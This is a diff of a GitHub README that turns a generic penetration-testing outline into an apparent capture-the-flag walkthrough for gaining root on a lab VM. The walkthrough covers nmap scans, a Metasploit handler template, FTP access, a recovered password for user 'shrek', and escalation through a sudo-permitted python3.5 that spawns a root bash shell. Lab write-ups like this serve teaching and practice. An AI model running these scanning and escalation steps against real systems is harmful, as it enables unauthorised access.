@@ -1,36 +1,39 @@
 # Privilege Escalation Project
-## verview
 
-In this project, the objective was to obtain root access on a provided virtual machine (VM) without visible IP addresses. The VM image 01-Local1.ova was used, and no modifications to GRUB or the VM configuration were allowed. The approach involved discovering the VM's IP address, scanning for open ports, identifying running services, and exploiting vulnerabilities to gain root access.
-Prerequisites
+## Overview
 
--  VirtualBox: Ensure VirtualBox is installed and configured to run the provided VM.
--   Nmap: Network scanning tool.
--   Metasploit: For exploitation (optional, based on findings).
--   Additional Tools: tcpdump, Wireshark, nikto, OpenVAS, etc. (as needed).
+In this project, the objective was to obtain root access on a provided virtual machine (VM) without visible IP addresses. The VM image `01-Local1.ova` was used, and no modifications to GRUB or the VM configuration were allowed. The approach involved discovering the VM's IP address, scanning for open ports, identifying running services, and exploiting vulnerabilities to gain root access.
+
+## Prerequisites
+
+- **VirtualBox**: Ensure VirtualBox is installed and configured to run the provided VM.
+- **Nmap**: Network scanning tool.
+- **Metasploit**: For exploitation (optional, based on findings).
+- **Additional Tools**: tcpdump, Wireshark, nikto, OpenVAS, etc. (as needed).
 
 ## Setup
 
-- Install the VM:
-1. Download the VM image: 01-Local1.utm.zip (for Apple Silicon CPUs).
-2. Import the VM into VirtualBox:
-3. Open VirtualBox.
-4. Go to File > Import Appliance.
-5. Select the downloaded file and follow the prompts.
+### Install the VM
 
-- Configure Networking:
+1. Download the VM image: `01-Local1.utm.zip` (for Apple Silicon CPUs).
+2. Import the VM into VirtualBox:
+   1. Open VirtualBox.
+   2. Go to `File > Import Appliance`.
+   3. Select the downloaded file and follow the prompts.
+
+### Configure Networking
+
 Ensure the VM is set up with the appropriate network configuration (NAT or Bridged Adapter) to allow for network scanning.
 
-- Steps
-1. Discover the VM's IP Address
+## Steps
 
-Network Scan: Use nmap to identify active IP addresses on the network:
+### 1. Discover the VM's IP Address
+
+**Network Scan**: Use `nmap` to identify active IP addresses on the network:
 
 ```bash
 nmap -sP 192.168.1.0/24
 ```
-
-Replace 0.0.0.0/24 with the network range of your local network.
 
 Advanced Scan: Once you identify possible IP addresses, perform a more detailed scan to confirm the VM's IP address:
 
@@ -57,7 +60,6 @@ nmap -sV <IP_OF_THE_VM>
 Service Analysis: Based on the services and versions detected, research known vulnerabilities. Use databases like CVE and Exploit-DB to find relevant exploits.
 
 Vulnerability Scanning: Optionally, use vulnerability scanning tools like nikto, OpenVAS, or Nessus for a comprehensive scan.
-
 4. Exploit Vulnerabilities
 
 Exploit Identification: If you find a vulnerable service, you may use tools like Metasploit to exploit it. Here’s an example command to use Metasploit for an exploit:
@@ -71,37 +73,91 @@ set LPORT <YOUR_PORT>
 exploit
 ```
 
-Manual Exploitation: If no automated exploit is available, we might need to manually exploit the vulnerability based on the information you gathered.
+5. Access the VM via FTP
 
-5. Escalate Privileges
+After analyzing the vulnerabilities, I discovered that FTP access was possible.
 
-Check SUID/SGID Binaries: List SUID/SGID binaries that might be exploited:
+Steps to Exploit FTP Access (after connexion):
+
+Navigate to /home:
 
 ```bash
-find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
+cd /home
+ls -a
 ```
 
-Search for Local Vulnerabilities: Look for misconfigurations or vulnerabilities in the VM's configuration and software.
+We found an shrek user and important.txt file.
 
-Privilege Escalation Techniques: Consider techniques like exploiting vulnerable services, leveraging misconfigured permissions, or using known privilege escalation exploits.
+Read important.txt:
 
-6. Final Steps
+```bash
+cat /home/important.txt
+```
 
-Obtain the Flag: After gaining root access, locate the flag. It is typically found in /root or /home directories.
+Result: it tells me to find and run /.runme.sh
 
-Document Your Findings: Ensure all steps taken, tools used, and findings are documented in this README.
+Find and Read runme.sh:
 
-## Conclusion
+```bash
+find / -name ".runme.sh" 2>/dev/null
+cat /.runme.sh
+```
 
-This document outlines the methodology for obtaining root access on the provided VM using network scanning and vulnerability exploitation. It emphasizes the importance of documenting each step and using ethical hacking practices.
+Result: I found an an encrypted string
 
-# Disclaimer
+Decrypt the Password Hash:
 
-The methods and tools described here are intended for educational purposes only. Ensure you have explicit permission before attempting any exploit-type activity. Unauthorized access is illegal and unethical.
-References
+Result: youaresmart (and i guess its the password of the user we found "shrek")
 
-Nmap Documentation
-Metasploit Framework
-Exploit-DB
+### Switch to shrek User:
+
+Upgrade the remote to a full tty:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Switch to shrek user and use : youaresmart as password
+
+Enter the password: youaresmart
+
+Check Sudo Privileges:
+
+```bash
+sudo -l
+```
+
+Result:
+
+javascript
+
+(root) NOPASSWD: /usr/bin/python3.5
+
+- Use Python to Spawn Root Shell:
+
+Run Python as root:
+
+```bash
+sudo /usr/bin/python3.5
+```
+
+In the Python shell:
+
+```bash
+import os
+os.system("/bin/bash")
+```
+
+Retrieve the Flag
+
+```bash
+cd /root
+ls -a
+cat /root/root.txt
+```
+
+Conclusion
+
+In this project, the process involved discovering the VM's IP address, scanning for open ports, and identifying vulnerabilities. By exploiting the FTP service and using a discovered password hash, I was able to switch users and gain root access. The final flag was retrieved from the root directory.
 
 github.com/dgthegeek
